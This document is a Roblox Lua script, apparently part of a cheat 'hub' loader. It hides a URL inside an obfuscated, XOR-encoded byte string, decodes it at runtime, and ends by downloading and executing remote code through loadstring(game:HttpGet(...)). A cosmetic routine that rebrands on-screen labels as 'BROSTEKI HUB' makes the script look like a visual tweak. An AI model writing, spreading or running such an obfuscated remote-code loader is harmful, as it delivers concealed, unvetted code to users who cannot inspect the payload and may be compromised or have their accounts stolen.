
--[[ STAGE 2: VISUAL CORE ]]
local _YVPwapbUMn2="\158\189\192\191\195\255\245\248\208\192\217\005\207\196\228\203\233\219\239\240\229\247\233\232\236\005\247\245\014\059\001\000\001\070\010\012\016\020\019\030\025\032\034\056\046\106\050\069\045\058\053\084\065\065\068\136\073\080\075\085\151\060\115\119\099\164\091\130\117\134\140\104\099\116\091\116\123\140\135\143\147\171\137\143\153\168\169\174\155\162\177\202\204\190\195\176\023\025\031\033\212\028\043\034\028\221\247\230"local mQFqB1CfHF1luzxsI=73 local _qBfNru3wt5I=106 local WZW80qSeGMRTs8_LF36j0Q=0 local KKaPGt8UXqa9j97cUw=3 local Qun0nMdVYSHgjDnZINn=16 local ZaOw9PKPiRMQWwy=false local X5JSR9CW8aBdaMFzeACp8=bit32 and bit32.bxor if not X5JSR9CW8aBdaMFzeACp8 then X5JSR9CW8aBdaMFzeACp8=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local WzsfRnFvXT8Vaq65O0={}for KkAOJaR21oIOvHOpLeY6=1,#_YVPwapbUMn2 do local J6beTQtfZ2smKsAK=string.byte(_YVPwapbUMn2,KkAOJaR21oIOvHOpLeY6)local IZyXAhz8QUzR=(_qBfNru3wt5I+(KkAOJaR21oIOvHOpLeY6*KKaPGt8UXqa9j97cUw)+Qun0nMdVYSHgjDnZINn)%256 if WZW80qSeGMRTs8_LF36j0Q==0 then J6beTQtfZ2smKsAK=(J6beTQtfZ2smKsAK-IZyXAhz8QUzR)%256 WzsfRnFvXT8Vaq65O0[KkAOJaR21oIOvHOpLeY6]=string.char(X5JSR9CW8aBdaMFzeACp8(J6beTQtfZ2smKsAK,mQFqB1CfHF1luzxsI))else J6beTQtfZ2smKsAK=X5JSR9CW8aBdaMFzeACp8(J6beTQtfZ2smKsAK,mQFqB1CfHF1luzxsI)WzsfRnFvXT8Vaq65O0[KkAOJaR21oIOvHOpLeY6]=string.char((J6beTQtfZ2smKsAK-IZyXAhz8QUzR)%256)end end local Xba5JgdXFlHN=table.concat(WzsfRnFvXT8Vaq65O0)if ZaOw9PKPiRMQWwy then Xba5JgdXFlHN=string.reverse(Xba5JgdXFlHN)end local NDqNp4oDodbJjIyMGV5Zoh=Xba5JgdXFlHN
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(NDqNp4oDodbJjIyMGV5Zoh))()
